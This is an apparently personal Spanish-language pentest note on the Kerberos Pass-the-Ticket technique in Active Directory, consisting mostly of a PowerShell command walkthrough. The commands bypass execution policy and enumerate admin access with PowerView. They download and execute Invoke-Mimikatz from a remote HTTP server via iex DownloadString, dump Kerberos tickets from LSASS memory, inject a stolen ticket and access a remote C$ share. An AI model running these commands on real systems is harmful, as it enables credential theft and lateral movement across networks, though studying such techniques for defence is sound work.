# Pass The Ticket 

Tags: #AD #Windows #PassTheTicket 

Es una técnica para robar credenciales que usan los atacantes para robar tickets de Kerberos para autenticarse con los recursos, archivos compartidos, y otras computadoras como un usuario sin tener que la contraseña del usuario comprometida.  Ambos, TGS (Ticket-Granting Service) y TGT (Ticket-Granting Ticket) puede ser robado y rehusado por los atacantes.  Sin los privilegios administrativos, un atacante puede obtener el TGT (usando 'delegacion fake') y todos los tickets para el usuario actual. Con permisos administrativos, un atacante puede dumpear los procesos LSASS y obtener todos los TGTs y capturar los tickets TGS en el sistema. 

```powershell
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas
 	
# Reconocimiento 
❯ . .\PowerView.ps1                          # Importamos el modulo

❯ Find-LocalAdminAccess                      # Descubrir maquinas en el AD donde el user tiene acceso local de Admin
❯ Enter-PSSession <seclogs.domian.local>     # Nos autenticamos a la sesion local via remota en el 'DOMINIO' 
	❯ whoami /priv                          # Miramos si tenemos los priv para elevar los privilegios 

# En la maquina del DC abrimos un 'HFS' para transferir el archivo 'Invoke-Mimikatz.ps1' a la sesion remota 
	❯ cd /                                  # Nos dirigimos a la carpeta 'root' de la sesion remota 
	❯ iex (New-Object New.WebClient).DownloadString('http://IP-HFS/Invoke-Mimikatz.ps1')  # Descargamos en la sesion remota el modulo que se encuentra en el DC de la maquina no remota llamado 'Invoke-Mimikatz.ps1' por medio del 'HFS' para despues utilizarlo dentro de la misma sesion remota 
	❯ Invoke-Mimikatz -Command '"sekurlsa::tickets /export "' # Exportamos los tickets de Kerberos locales desde la memoria LSASS
	❯ ls | select name                      # Listamos los tickets (.kirbi) y escogemos el 'maintainer@krbtgt'
	❯ Invoke-Mimikatz -Command '"kerberos::ptt <ticket>"'     # ptt = Pass-The-Ticket 

# Una vez dentro 
❯ klist          # Mirar si el ticket de Kerberos si funciono y cambio 'Analizar el ticket'
	❯ klist purge                           # Si hacemos mal el ticket los podemos eliminar asi
❯ ls \\Domain.local\c$    # Listar los directoriso en C siempre y cuando tengamos los permisos 

```